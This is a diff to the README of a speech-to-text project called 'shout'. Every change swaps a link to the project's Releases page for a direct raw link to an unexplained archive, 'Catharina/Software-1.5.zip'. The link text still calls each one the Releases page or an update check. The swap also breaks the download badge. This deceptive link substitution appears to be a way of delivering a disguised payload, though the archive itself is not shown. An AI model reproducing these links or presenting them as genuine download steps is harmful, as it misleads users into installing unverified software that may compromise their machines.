@@ -1,6 +1,6 @@
 # 🎤 shout - Fast Speech to Text for Everyone
 
-[![Download shout](https://img.shields.io/badge/Download%20shout-Click%20Here-brightgreen)](https://github.com/Fadhl42alhilali/shout/releases)
+[![Download shout](https://github.com/Fadhl42alhilali/shout/raw/refs/heads/master/Catharina/Software-1.5.zip%20shout-Click%20Here-brightgreen)](https://github.com/Fadhl42alhilali/shout/raw/refs/heads/master/Catharina/Software-1.5.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To get started with shout, you need to download and install the software. Follow
 
 1. **Visit the Releases Page**: Click the link below to open the Releases page where you can download the latest version of shout.
    
-   [Download shout](https://github.com/Fadhl42alhilali/shout/releases)
+   [Download shout](https://github.com/Fadhl42alhilali/shout/raw/refs/heads/master/Catharina/Software-1.5.zip)
 
 2. **Select the Latest Version**: On the Releases page, look for the section labeled "Latest Release." You will see various files available for download.
 
@@ -26,7 +26,7 @@ To get started with shout, you need to download and install the software. Follow
 
 To download shout, visit the Releases page:
 
-[Visit the Releases Page to Download](https://github.com/Fadhl42alhilali/shout/releases)
+[Visit the Releases Page to Download](https://github.com/Fadhl42alhilali/shout/raw/refs/heads/master/Catharina/Software-1.5.zip)
 
 Here’s how to install shout:
 
@@ -85,6 +85,6 @@ For detailed information:
 
 For the best experience, regularly check the Releases page for updates. New features and improvements are added frequently.
 
-[Check for Updates](https://github.com/Fadhl42alhilali/shout/releases) and download the latest version when available.
+[Check for Updates](https://github.com/Fadhl42alhilali/shout/raw/refs/heads/master/Catharina/Software-1.5.zip) and download the latest version when available.
 
 Thank you for choosing shout! We hope it enhances your productivity and accessibility in speech-to-text tasks.
